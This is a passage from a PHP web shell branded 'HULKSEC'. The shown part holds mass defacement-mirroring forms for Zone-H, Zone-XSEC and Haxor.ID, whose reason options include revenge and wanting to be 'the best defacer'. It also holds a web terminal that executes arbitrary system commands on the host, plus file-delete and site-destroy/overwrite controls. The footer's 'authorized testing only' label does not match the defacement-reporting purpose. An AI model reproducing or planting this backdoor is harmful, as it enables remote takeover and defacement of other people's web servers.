                                <option value="2">undisclosed (new) vulnerability</option>
                                <option value="3">configuration / admin. mistake</option>
                                <option value="4">brute force attack</option>
                                <option value="5">social engineering</option>
                                <option value="6">Web Server intrusion</option>
                                <option value="7">SQL Injection</option>
                                <option value="8">URL Poisoning</option>
                                <option value="9">File Inclusion</option>
                                <option value="10">Cross-Site Scripting</option>
                                <option value="11">Remote service password bruteforce</option>
                            </select>
                        </div>

                        <div class="form-group">
                            <label><i class="fas fa-question-circle"></i> Reason *</label>
                            <select name="mass_reason" required style="background: rgba(0, 0, 0, 0.6);">
                                <option value="1">Heh...just for fun!</option>
                                <option value="2">Revenge against that website</option>
                                <option value="3">Political reasons</option>
                                <option value="4">As a challenge</option>
                                <option value="5">I just want to be the best defacer</option>
                                <option value="6">Patriotism</option>
                            </select>
                        </div>

                        <div class="form-group">
                            <input type="checkbox" id="zoneh_mass" name="zoneh_mass" value="1" checked>
                            <label for="zoneh_mass" style="display: inline; margin-left: 5px; color: var(--text-primary);">
                                <i class="fas fa-check-circle glow-green"></i> Enable Zone-H Mass Mirroring
                            </label>
                        </div>

                        <button type="submit" class="btn-xsec">
                            <i class="fas fa-broadcast-tower"></i> EXECUTE ZONE-H MASS MIRROR
                        </button>
                    </form>
                </div>

                <!-- Zone-XSEC Mirroring -->
                <div class="panel">
                    <div class="panel-title">
                        <i class="fas fa-globe"></i> ZONE-XSEC MIRRORING
                    </div>
                    <p class="description">Zone-XSEC mirroring with complete form fields</p>
                    <form method="post">
                        <div class="form-group">
                            <label><i class="fas fa-link"></i> Target URLs (one per line) *</label>
                            <textarea name="mass_mirror_urls" rows="3" placeholder="http://example.com" required style="background: rgba(0, 0, 0, 0.6);"></textarea>
                        </div>

                        <div class="form-group">
                            <label><i class="fas fa-user-secret"></i> Attacker *</label>
                            <input type="text" name="mass_nickname" placeholder="Attacker name" required style="background: rgba(0, 0, 0, 0.6);">
                        </div>

                        <div class="form-group">
                            <label><i class="fas fa-users"></i> Team</label>
                            <input type="text" name="mass_team" placeholder="Team name" style="background: rgba(0, 0, 0, 0.6);">
                        </div>

                        <div class="form-group">
                            <label><i class="fas fa-code"></i> Proof of Concept *</label>
                            <select name="xsec_poc" required style="background: rgba(0, 0, 0, 0.6);">
                                <option value="1">known vulnerability (i.e. unpatched system)</option>
                                <option value="2">undisclosed (new) vulnerability</option>
                                <option value="3">configuration / admin. mistake</option>
                                <option value="7">SQL Injection</option>
                                <option value="8">URL Poisoning</option>
                                <option value="9">File Inclusion</option>
                                <option value="22">Cross-Site Scripting</option>
                            </select>
                        </div>

                        <div class="form-group">
                            <label><i class="fas fa-question-circle"></i> Reason *</label>
                            <select name="xsec_reason" required style="background: rgba(0, 0, 0, 0.6);">
                                <option value="1">Heh...just for fun!</option>
                                <option value="2">Revenge against that website</option>
                                <option value="3">Political reasons</option>
                                <option value="4">As a challenge</option>
                                <option value="5">I just want to be the best defacer</option>
                                <option value="6">Patriotism</option>
                            </select>
                        </div>

                        <div class="form-group">
                            <input type="checkbox" id="xsec_mass" name="xsec_mass" value="1" checked>
                            <label for="xsec_mass" style="display: inline; margin-left: 5px; color: var(--text-primary);">
                                <i class="fas fa-check-circle glow-green"></i> Enable Zone-XSEC Mirroring
                            </label>
                        </div>

                        <button type="submit" class="btn-xsec">
                            <i class="fas fa-share-alt"></i> MIRROR TO ZONE-XSEC
                        </button>
                    </form>
                </div>

                <!-- Haxor.ID Mirroring -->
                <div class="panel">
                    <div class="panel-title">
                        <i class="fas fa-id-card"></i> HAXOR.ID MIRRORING
                    </div>
                    <p class="description">Haxor.ID mirroring with proper form structure</p>
                    <form method="post">
                        <div class="form-group">
                            <label><i class="fas fa-link"></i> URL *</label>
                            <textarea name="mass_mirror_urls" rows="2" placeholder="http://example.com" required style="background: rgba(0, 0, 0, 0.6);"></textarea>
                        </div>

                        <div class="form-group">
                            <label><i class="fas fa-user-secret"></i> Attacker *</label>
                            <input type="text" name="mass_nickname" placeholder="Attacker name" required style="background: rgba(0, 0, 0, 0.6);">
                        </div>

                        <div class="form-group">
                            <label><i class="fas fa-users"></i> Team</label>
                            <input type="text" name="mass_team" placeholder="Team name" style="background: rgba(0, 0, 0, 0.6);">
                        </div>

                        <div class="form-group">
                            <label><i class="fas fa-code"></i> PoC *</label>
                            <select name="haxor_poc" required style="background: rgba(0, 0, 0, 0.6);">
                                <option value="1">known vulnerability (i.e. unpatched system)</option>
                                <option value="2">undisclosed (new) vulnerability</option>
                                <option value="3">configuration / admin. mistake</option>
                                <option value="7">SQL Injection</option>
                                <option value="9">File Inclusion</option>
                                <option value="22">Cross-Site Scripting</option>
                            </select>
                        </div>

                        <div class="form-group">
                            <label><i class="fas fa-question-circle"></i> Reason *</label>
                            <select name="haxor_reason" required style="background: rgba(0, 0, 0, 0.6);">
                                <option value="1">Heh...just for fun!</option>
                                <option value="2">Revenge against that website</option>
                                <option value="3">Political reasons</option>
                                <option value="4">As a challenge</option>
                                <option value="5">I just want to be the best defacer</option>
                                <option value="6">Patriotism</option>
                            </select>
                        </div>

                        <div class="form-group">
                            <input type="checkbox" id="haxor_mass" name="haxor_mass" value="1" checked>
                            <label for="haxor_mass" style="display: inline; margin-left: 5px; color: var(--text-primary);">
                                <i class="fas fa-check-circle glow-green"></i> Enable Haxor.ID Mirroring
                            </label>
                        </div>

                        <button type="submit" class="btn-xsec">
                            <i class="fas fa-share-square"></i> MIRROR TO HAXOR.ID
                        </button>
                    </form>
                </div>
            </div>

            <!-- Mirroring Results -->
            <?php if (isset($_SESSION['mirror_results'])): ?>
            <div class="results-panel">
                <div class="panel-title">
                    <i class="fas fa-clipboard-list"></i> Mirroring Results
                </div>
                <div class="glow-green" style="text-align: center; margin-bottom: 10px;">
                    Processed: <?php echo $_SESSION['mirror_count']; ?> mirroring attempts
                </div>
                <?php foreach ($_SESSION['mirror_results'] as $result): ?>
                    <div class="result-item">
                        <?= $result ?>
                    </div>
                <?php endforeach; ?>
                <?php unset($_SESSION['mirror_results'], $_SESSION['mirror_count']); ?>
            </div>
            <?php endif; ?>
        </div>

        <!-- Terminal Tab -->
        <div id="terminal" class="tab-content" style="display: none;">
            <div class="panel">
                <div class="panel-title">
                    <i class="fas fa-terminal"></i> System Terminal
                </div>
                <p class="description">Advanced command execution interface. Execute system commands and scripts directly from the web interface.</p>
                <div class="terminal" id="terminal-output">
                    <div>> Welcome to HULKSEC Advanced Terminal</div>
                    <div>> System: <?= $fc[0]() ?></div>
                    <div>> PHP: <?= $fc[1]() ?></div>
                    <div>> Current Directory: <?= $p ?></div>
                    <div>> Status: <span style="color: #00ff00;">READY</span></div>
                    <?php if (isset($_SESSION['terminal_result'])): ?>
                        <div>> Command: <?= htmlspecialchars($_SESSION['terminal_result']['command']) ?></div>
                        <div>> Output:</div>
                        <?php foreach ($_SESSION['terminal_result']['output'] as $line): ?>
                            <div><?= htmlspecialchars($line) ?></div>
                        <?php endforeach; ?>
                        <div>> Return Code: <?= $_SESSION['terminal_result']['return_code'] ?></div>
                        <?php unset($_SESSION['terminal_result']); ?>
                    <?php endif; ?>
                    <div>> _</div>
                </div>
                <form method="post" style="margin-top: 15px;">
                    <div class="form-group">
                        <label><i class="fas fa-keyboard"></i> Command Input</label>
                        <input type="text" name="terminal_command" placeholder="Enter system command..." required style="color: var(--text-primary); background: rgba(0, 0, 0, 0.6);">
                    </div>
                    <button type="submit" class="btn-xsec">
                        <i class="fas fa-play"></i> Execute Command
                    </button>
                </form>
            </div>
        </div>

        <!-- Footer -->
        <div class="footer">
            HULKSEC PH | CYBERSECURITY RESEARCH | ADVANCED PENETRATION TESTING PLATFORM
            <br>
            <span style="font-size: 0.8em; color: var(--text-secondary);">
                FOR AUTHORIZED SECURITY TESTING ONLY | &copy; 2023 HULKSEC PHILIPPINES | Developed by Fiziru HPH
            </span>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
    <script>
        // Initialize particles background
        document.addEventListener('DOMContentLoaded', function() {
            particlesJS('particles-js', {
                "particles": {
                    "number": { "value": 100, "density": { "enable": true, "value_area": 800 } },
                    "color": { "value": ["#b967ff", "#d8b4ff"] },
                    "shape": { "type": "circle", "stroke": { "width": 0, "color": "#000000" } },
                    "opacity": { "value": 0.5, "random": true, "anim": { "enable": true, "speed": 1, "opacity_min": 0.1, "sync": false } },
                    "size": { "value": 3, "random": true, "anim": { "enable": true, "speed": 2, "size_min": 0.1, "sync": false } },
                    "line_linked": { "enable": true, "distance": 150, "color": "#8a2be2", "opacity": 0.4, "width": 1 },
                    "move": { "enable": true, "speed": 2, "direction": "none", "random": true, "straight": false, "out_mode": "out", "bounce": false, "attract": { "enable": false, "rotateX": 600, "rotateY": 1200 } }
                },
                "interactivity": {
                    "detect_on": "canvas",
                    "events": {
                        "onhover": { "enable": true, "mode": "repulse" },
                        "onclick": { "enable": true, "mode": "push" },
                        "resize": true
                    },
                    "modes": {
                        "repulse": { "distance": 100, "duration": 0.4 },
                        "push": { "particles_nb": 4 }
                    }
                },
                "retina_detect": true
            });
        });

        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.style.display = 'none';
            });
            document.querySelectorAll('.nav-tab').forEach(tab => {
                tab.classList.remove('active');
            });
            document.getElementById(tabName).style.display = 'block';
            event.currentTarget.classList.add('active');
            if (tabName === 'terminal') {
                setTimeout(() => {
                    const terminal = document.getElementById('terminal-output');
                    if (terminal) {
                        terminal.scrollTop = terminal.scrollHeight;
                    }
                }, 100);
            }
        }

        function toggleOverwriteContent() {
            const method = document.querySelector('select[name="destroy_method"]').value;
            const contentDiv = document.getElementById('overwrite-content');
            contentDiv.style.display = method === 'overwrite' ? 'block' : 'none';
        }

        document.querySelectorAll('.delete').forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                let type = this.getAttribute('data-type');
                let href = this.getAttribute('href');
                if (confirm(`Are you sure you want to delete this ${type}?`)) {
                    let separator = href.includes('?') ? '&' : '?';
                    window.location.href = href + separator + 't=' + (type === 'folder' ? 'd' : 'f');
                }
            });
        });

        document.addEventListener('DOMContentLoaded', function() {
            showTab('file-manager');
        });
    </script>
</body>
</html>
<?php  ?>
